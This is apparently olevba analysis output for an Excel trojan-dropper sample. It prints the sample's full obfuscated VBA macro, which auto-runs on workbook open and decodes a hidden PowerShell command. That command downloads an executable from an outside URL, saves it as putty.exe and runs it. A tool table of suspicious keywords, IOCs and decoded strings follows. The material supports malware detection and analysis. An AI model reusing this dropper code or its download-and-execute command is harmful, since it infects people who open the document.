olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Dropper.MSOffice.SDrop.gen-ff4386a4ec4746d085fe2fa9cf974f39334fa3c64b27b2ab88468ea72c898fb2
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
Loader"aHR0cDovL2NvbWF3aGltcGxldC5jb20vbnh4dC5leGU="
End Sub
Public Sub Loader(Link As String)

CreateObject(OHbOYszJOHqgDkedBOSubRocPBgnBNntYHuaNqBaWDWNOzvzSRAZATe("57 53 63 72 69 70 74 2E 53 68 65 6C 6C")).Run (Base64Decode("cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLVcgSGlkZGVuIC1jb21tYW5kIChuZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJw==" & Link & "JywkZW52OlRlbXArJ1xwdXR0eS5leGUnKTsoTmV3LU9iamVjdCAtY29tIFNoZWxsLkFwcGxpY2F0aW9uKS5TaGVsbEV4ZWN1dGUoJGVudjpUZW1wKydccHV0dHkuZXhlJyk="))

End Sub

Function fd3icrngvzu(str As String) As Variant: Dim bytes() As Byte: bytes = str: fd3icrngvzu = bytes: End Function
Function e55wb1k43zzcli1p6(bytes() As Byte) As String: Dim str As String: str = bytes: e55wb1k43zzcli1p6 = str: End Function

Function hp61wnmk00h25j9vs(str As String) As String
    Const VBCGhdMK_ As String = "m2uerz0kiwwwjhmlc"
    Dim GKiaNHB_() As Byte, SokNAH_() As Byte
    GKiaNHB_ = fd3icrngvzu(str)
    SOtAN_ = fd3icrngvzu(VBCGhdMK_)
    
    Dim BoLpaBH As Long
    BoLpaBH = UBound(GKiaNHB_)
    
    ReDim KoSoVoBPo_(0 To BoLpaBH) As Byte
    
    Dim idx As Long
    
    For idx = LBound(GKiaNHB_) To BoLpaBH:
        If Not GKiaNHB_(idx) = 0 Then
            c = GKiaNHB_(idx)
            For i = 0 To UBound(SOtAN_):
                c = c Xor SOtAN_(i)
            Next i
            KoSoVoBPo_(idx) = c
        End If
    
    Next idx
    
    hp61wnmk00h25j9vs = e55wb1k43zzcli1p6(KoSoVoBPo_)
End Function



Public Function OHbOYszJOHqgDkedBOSubRocPBgnBNntYHuaNqBaWDWNOzvzSRAZATe(ByVal EmQZTpMNoPPgDmQqfolNHJfeVdRHwkIRZIvxkPMSoNudyOhjXRiDLln As String) As String
Dim je2e1ms1s5lqbhib6 As String
Dim jmb5q1r64xbbr9w1k As String
Dim g6ttyb80srsf254xu As Long
    For mVTzrmmdSuUPlQfWzeYutCDYutRakyzZEDePAULnBGOttZQAoINrcev = 1 To Len(EmQZTpMNoPPgDmQqfolNHJfeVdRHwkIRZIvxkPMSoNudyOhjXRiDLln) Step 3
        wSyzXMLHWUSHvLYkKMMXYQvilaCUFhOtEcxHOMzjKQAtRrAJPgqiIRa = Chr$(Val(hp61wnmk00h25j9vs("D" & Chr(42)) & Mid$(EmQZTpMNoPPgDmQqfolNHJfeVdRHwkIRZIvxkPMSoNudyOhjXRiDLln, mVTzrmmdSuUPlQfWzeYutCDYutRakyzZEDePAULnBGOttZQAoINrcev, 2)))
        jmb5q1r64xbbr9w1k = jmb5q1r64xbbr9w1k & wSyzXMLHWUSHvLYkKMMXYQvilaCUFhOtEcxHOMzjKQAtRrAJPgqiIRa
    Next mVTzrmmdSuUPlQfWzeYutCDYutRakyzZEDePAULnBGOttZQAoINrcev
    OHbOYszJOHqgDkedBOSubRocPBgnBNntYHuaNqBaWDWNOzvzSRAZATe = jmb5q1r64xbbr9w1k
End Function

Function Base64Decode(ByVal base64String)
  
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, hp61wnmk00h25j9vs("B" & ""), "")
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, hp61wnmk00h25j9vs(" " & "" & "" & "" & Chr(17) & "" & Chr(7) & Chr(84) & "V" & "" & "&" & Chr(7) & Chr(1) & "" & Chr(6) & Chr(7) & ""), hp61wnmk00h25j9vs(" " & Chr(3) & Chr(6) & "" & "B" & " " & "" & "" & "" & "" & Chr(7) & "" & "T" & "" & "V" & "B" & "" & "" & "" & "" & "" & "
" & "" & "
" & "" & Chr(5) & Chr(76) & "")
    Exit Function
  End If
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3
      
      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = hp61wnmk00h25j9vs(Chr(95) & "") Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then

Err.Raise 1, "Base64Decode", "Bad Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
   
    nGroup = Hex(nGroup)
    
    
    nGroup = String(6 - Len(nGroup), hp61wnmk00h25j9vs(Chr(82))) & nGroup
    
    
    pOut = Chr(CByte(hp61wnmk00h25j9vs("D" & Chr(42)) & Mid(nGroup, 1, 2))) + _
      Chr(CByte(hp61wnmk00h25j9vs("D" & Chr(42)) & Mid(nGroup, 3, 2))) + _
      Chr(CByte(hp61wnmk00h25j9vs("D" & Chr(42)) & Mid(nGroup, 5, 2)))
    
   
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function
-------------------------------------------------------------------------------
VBA MACRO Sheet 1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command (obfuscation: Base64)                |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command (obfuscation: Base64)                |
|Suspicious|powershell          |May run PowerShell commands (obfuscation:    |
|          |                    |Base64)                                      |
|Suspicious|executionpolicy     |May run PowerShell commands (obfuscation:    |
|          |                    |Base64)                                      |
|Suspicious|command             |May run PowerShell commands (obfuscation:    |
|          |                    |Base64)                                      |
|Suspicious|new-object          |May create an OLE object using PowerShell    |
|          |                    |(obfuscation: Base64)                        |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject) (obfuscation: Base64)          |
|Suspicious|Net.WebClient       |May download files from the Internet using   |
|          |                    |PowerShell (obfuscation: Base64)             |
|Suspicious|DownloadFile        |May download files from the Internet using   |
|          |                    |PowerShell (obfuscation: Base64)             |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib) (obfuscation: Base64)            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://comawhimplet.|URL (obfuscation: Base64)                    |
|          |com/nxxt.exe        |                                             |
|IOC       |nxxt.exe            |Executable file name (obfuscation: Base64)   |
|IOC       |powershell.exe      |Executable file name (obfuscation: Base64)   |
|IOC       |putty.exe           |Executable file name (obfuscation: Base64)   |
|Base64    |http://comawhimplet.|aHR0cDovL2NvbWF3aGltcGxldC5jb20vbnh4dC5leGU= |
|String    |com/nxxt.exe        |                                             |
|Base64    |powershell.exe      |cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBie|
|String    |-executionpolicy    |XBhc3MgLVcgSGlkZGVuIC1jb21tYW5kIChuZXctb2JqZW|
|          |bypass -W Hidden    |N0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZ|
|          |-command (new-object|pbGUoJw==                                    |
|          |System.Net.WebClient|                                             |
|          |).DownloadFile('    |                                             |
|Base64    |',$env:Temp+'\putty.|JywkZW52OlRlbXArJ1xwdXR0eS5leGUnKTsoTmV3LU9ia|
|String    |exe');(New-Object   |mVjdCAtY29tIFNoZWxsLkFwcGxpY2F0aW9uKS5TaGVsbE|
|          |-com Shell.Applicati|V4ZWN1dGUoJGVudjpUZW1wKydccHV0dHkuZXhlJyk=   |
|          |on).ShellExecute($en|                                             |
|          |v:Temp+'\putty.exe')|                                             |
+----------+--------------------+---------------------------------------------+

